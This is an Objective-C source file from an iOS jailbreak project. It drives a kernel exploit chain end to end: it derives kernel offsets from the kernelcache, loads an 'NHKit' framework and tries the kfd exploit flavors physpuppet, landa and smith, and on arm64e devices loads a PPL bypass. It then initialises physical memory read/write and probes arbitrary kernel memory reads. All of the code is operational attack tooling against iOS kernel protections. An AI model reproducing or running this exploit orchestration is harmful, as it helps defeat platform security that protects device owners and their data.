//
//  Step9KreadRunner.m
//

#import "Step9KreadRunner.h"
#import "KernelcacheLocator.h"
#import "JBDylibLoader.h"
#import <dlfcn.h>
#import <sys/sysctl.h>
#import <xpc/xpc.h>

typedef int (*XpfStartFn)(const char *);
typedef void (*XpfStopFn)(void);
typedef const char *(*XpfGetErrorFn)(void);
typedef bool (*XpfSetSupportedFn)(const char *);
typedef xpc_object_t (*XpfConstructFn)(const char *sets[]);
typedef void (*JbinfoDynFn)(xpc_object_t);
typedef void (*JbinfoHardFn)(void);
typedef void (*JbinfoBootFn)(void);
typedef void (*VoidFn)(void);
typedef int (*IntBoolFn)(bool);
typedef int (*PhysrwPteFn)(bool, uint64_t);
typedef bool (*BoolFn)(void);
typedef int (*ExploitInitFn)(const char *);
typedef int (*ExploitDeinitFn)(void);
typedef int (*KreadbufFn)(uint64_t, void *, size_t);

// 与 dependencies/include/xpf/xpf.h 中 XPF 到 kernelBase 的布局对齐（arm64）
typedef struct {
  int kernelFd;
  void *mappedKernel;
  size_t kernelSize;
  void *decompressedKernel;
  size_t decompressedKernelSize;
  void *kernelContainer;
  void *kernel;
  bool kernelIsFileset;
  bool kernelIsArm64e;
  char *kernelVersionString;
  char *kernelInfoPlist;
  char *darwinVersion;
  char *xnuBuild;
  char *xnuPlatform;
  char *osVersion;
  uint64_t kernelBase;
  uint64_t kernelEntry;
} XPFKernelBaseView;

@implementation Step9KreadRunner

+ (void *)sym:(const char *)name {
  void *p = dlsym(RTLD_DEFAULT, name);
  if (!p) {
    char buf[256];
    snprintf(buf, sizeof(buf), "_%s", name);
    p = dlsym(RTLD_DEFAULT, buf);
  }
  return p;
}

+ (BOOL)isArm64e {
  cpu_subtype_t sub = 0;
  size_t len = sizeof(sub);
  if (sysctlbyname("hw.cpusubtype", &sub, &len, NULL, 0) == -1) {
    return NO;
  }
  return (sub & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;
}

+ (void *)dlopenFrameworkNamed:(NSString *)name log:(void (^)(NSString *))log {
  NSString *root = [NSBundle mainBundle].bundlePath;
  NSArray<NSString *> *cands = @[
    [[root stringByAppendingPathComponent:@"Frameworks"] stringByAppendingPathComponent:
                                                             [name stringByAppendingPathExtension:@"framework"]],
    [root stringByAppendingPathComponent:[name stringByAppendingPathExtension:@"framework"]],
  ];
  for (NSString *fw in cands) {
    NSString *bin = [fw stringByAppendingPathComponent:name];
    if (![[NSFileManager defaultManager] fileExistsAtPath:bin]) {
      continue;
    }
    dlerror();
    void *h = dlopen(bin.fileSystemRepresentation, RTLD_NOW | RTLD_GLOBAL);
    if (h) {
      log([NSString stringWithFormat:@"dlopen OK: %@", bin]);
      return h;
    }
    const char *err = dlerror();
    log([NSString stringWithFormat:@"dlopen 失败 %@: %s", bin, err ? err : "?"]);
  }
  log([NSString stringWithFormat:@"未找到 Frameworks/%@.framework/%@", name, name]);
  return NULL;
}

+ (BOOL)runExploitAndProbeKreadWithLog:(void (^)(NSString *))logBlock {
  void (^log)(NSString *) = ^(NSString *line) {
    if (logBlock) {
      logBlock(line);
    }
  };

  if (!JBEnsureJailbreakDylibsLoaded()) {
    log(@"越狱三库未就绪");
    return NO;
  }

  XpfStartFn startFn = [self sym:"xpf_start_with_kernel_path"];
  XpfStopFn stopFn = [self sym:"xpf_stop"];
  XpfGetErrorFn errFn = [self sym:"xpf_get_error"];
  XpfSetSupportedFn setFn = [self sym:"xpf_set_is_supported"];
  XpfConstructFn constructFn = [self sym:"xpf_construct_offset_dictionary"];
  JbinfoDynFn jbDyn = [self sym:"jbinfo_initialize_dynamic_offsets"];
  JbinfoHardFn jbHard = [self sym:"jbinfo_initialize_hardcoded_offsets"];
  JbinfoBootFn jbBoot = [self sym:"jbinfo_initialize_boot_constants"];
  VoidFn transInit = [self sym:"libjailbreak_translation_init"];
  VoidFn iosurfInit = [self sym:"libjailbreak_IOSurface_primitives_init"];
  BoolFn physrwPteSupported = [self sym:"device_supports_physrw_pte"];
  PhysrwPteFn physrwPteInit = [self sym:"libjailbreak_physrw_pte_init"];
  IntBoolFn physrwInit = [self sym:"libjailbreak_physrw_init"];
  KreadbufFn kreadbufFn = [self sym:"kreadbuf"];
  XPFKernelBaseView *gXPF = [self sym:"gXPF"];

  if (!startFn || !constructFn || !jbDyn || !jbHard || !kreadbufFn) {
    log(@"关键符号缺失（xpf/jbinfo/kreadbuf）");
    return NO;
  }

  NSString *kc = [KernelcacheLocator accessibleKernelPathWithLog:log];
  if (!kc) {
    log(@"无可用 kernelcache");
    return NO;
  }
  log([NSString stringWithFormat:@"kernelcache=%@", kc]);

  if (stopFn) {
    stopFn();
  }
  int rc = startFn(kc.fileSystemRepresentation);
  const char *xerr = errFn ? errFn() : NULL;
  log([NSString stringWithFormat:@"xpf_start rc=%d err=%s", rc, (xerr && xerr[0]) ? xerr : "(null)"]);
  if (rc != 0) {
    return NO;
  }

  uint64_t staticBase = gXPF ? gXPF->kernelBase : 0;
  log([NSString stringWithFormat:@"gXPF.kernelBase=0x%llx arm64e=%d", (unsigned long long)staticBase,
                                 gXPF ? (gXPF->kernelIsArm64e ? 1 : 0) : -1]);

  const char *sets[12] = {
      "translation", "trustcache", "sandbox", "physmap", "struct", "physrw", "perfkrw",
      NULL,          NULL,         NULL,      NULL,      NULL,
  };
  uint32_t idx = 7;
  if (setFn) {
    if (setFn("devmode")) {
      sets[idx++] = "devmode";
    }
    if (setFn("badRecovery")) {
      sets[idx++] = "badRecovery";
    }
    if (setFn("arm64kcall")) {
      sets[idx++] = "arm64kcall";
    }
  }

  xpc_object_t dict = constructFn((const char **)sets);
  if (!dict) {
    xerr = errFn ? errFn() : NULL;
    log([NSString stringWithFormat:@"construct NULL err=%s", (xerr && xerr[0]) ? xerr : "(null)"]);
    if (stopFn) {
      stopFn();
    }
    return NO;
  }
  if (staticBase) {
    xpc_dictionary_set_uint64(dict, "kernelConstant.staticBase", staticBase);
  }
  jbDyn(dict);
  jbHard();
  log(@"jbinfo 偏移已灌入");
  if (stopFn) {
    stopFn();
  }

  // —— Kernel exploit（NHKit / kfd）——
  void *kfdHandle = [self dlopenFrameworkNamed:@"NHKit" log:log];
  if (!kfdHandle) {
    return NO;
  }
  ExploitInitFn kInit = dlsym(kfdHandle, "exploit_init");
  ExploitDeinitFn kDeinit = dlsym(kfdHandle, "exploit_deinit");
  if (!kInit) {
    log(@"NHKit 无 exploit_init");
    return NO;
  }

  NSArray<NSString *> *flavors = @[ @"physpuppet", @"landa", @"smith" ];
  BOOL kOk = NO;
  NSString *usedFlavor = nil;
  for (NSString *fl in flavors) {
    log([NSString stringWithFormat:@"尝试 kernel exploit_init(%@)", fl]);
    int er = kInit(fl.UTF8String);
    log([NSString stringWithFormat:@"exploit_init(%@) rc=%d", fl, er]);
    if (er == 0) {
      kOk = YES;
      usedFlavor = fl;
      break;
    }
    if (kDeinit) {
      (void)kDeinit();
    }
  }
  if (!kOk) {
    log(@"全部 kfd flavor 失败");
    return NO;
  }
  log([NSString stringWithFormat:@"kernel exploit 成功: %@", usedFlavor]);

  if (jbBoot) {
    jbBoot();
  }
  if (transInit) {
    transInit();
  }
  if (iosurfInit) {
    iosurfInit();
  }
  log(@"boot_constants / translation / IOSurface 已初始化");

  // —— PPL（arm64e 且 <16.6 需要；dmaFail → NHDraw）——
  if ([self isArm64e]) {
    log(@"设备 arm64e，加载 PPL bypass (NHDraw/dmaFail)");
    void *pplHandle = [self dlopenFrameworkNamed:@"NHDraw" log:log];
    if (!pplHandle) {
      log(@"PPL framework 缺失，继续尝试 kread（可能失败）");
    } else {
      ExploitInitFn pInit = dlsym(pplHandle, "exploit_init");
      if (pInit) {
        int pr = pInit("default");
        log([NSString stringWithFormat:@"PPL exploit_init rc=%d", pr]);
      } else {
        log(@"NHDraw 无 exploit_init");
      }
    }
  } else {
    log(@"非 arm64e，跳过 PPL");
  }

  // —— PhysRW（可选，失败不直接判死）——
  if (physrwPteSupported && physrwPteSupported() && physrwPteInit) {
    int pr = physrwPteInit(false, 0);
    log([NSString stringWithFormat:@"physrw_pte_init rc=%d", pr]);
  } else if (physrwInit) {
    int pr = physrwInit(false);
    log([NSString stringWithFormat:@"physrw_init rc=%d", pr]);
  }

  // —— kread 探针：读内核 Mach-O magic ——
  uint64_t base = staticBase;
  // jbinfo_initialize_boot_constants 后 base 可能变成 slide+staticBase；优先用 kread 试 staticBase
  uint32_t magic = 0;
  int kr = kreadbufFn(base, &magic, sizeof(magic));
  log([NSString stringWithFormat:@"kreadbuf(0x%llx) rc=%d magic=0x%08x", (unsigned long long)base, kr, magic]);

  BOOL ok = (kr == 0 && (magic == 0xFEEDFACF || magic == 0xFEEDFACE));
  if (!ok && base != 0) {
    // 再试常见对齐：若 boot constants 改写了 slide，尝试从 gSystemInfo
    void *gs = [self sym:"gSystemInfo"];
    if (gs) {
      // kernelConstant.base 是 struct 起始后第 3 个 uint64（slide, staticBase, base）
      uint64_t *kconst = (uint64_t *)gs;
      uint64_t slidBase = kconst[2];
      if (slidBase && slidBase != base) {
        magic = 0;
        kr = kreadbufFn(slidBase, &magic, sizeof(magic));
        log([NSString stringWithFormat:@"kreadbuf(gSystemInfo.base=0x%llx) rc=%d magic=0x%08x",
                                       (unsigned long long)slidBase, kr, magic]);
        ok = (kr == 0 && (magic == 0xFEEDFACF || magic == 0xFEEDFACE));
        base = slidBase;
      }
    }
  }

  if (ok) {
    log([NSString stringWithFormat:@"验收⑨：kread 成功 base=0x%llx magic=0x%08x（未链 PhysX/BBZView）",
                                   (unsigned long long)base, magic]);
  } else {
    log(@"验收⑨：kread 探针失败");
  }
  return ok;
}

@end
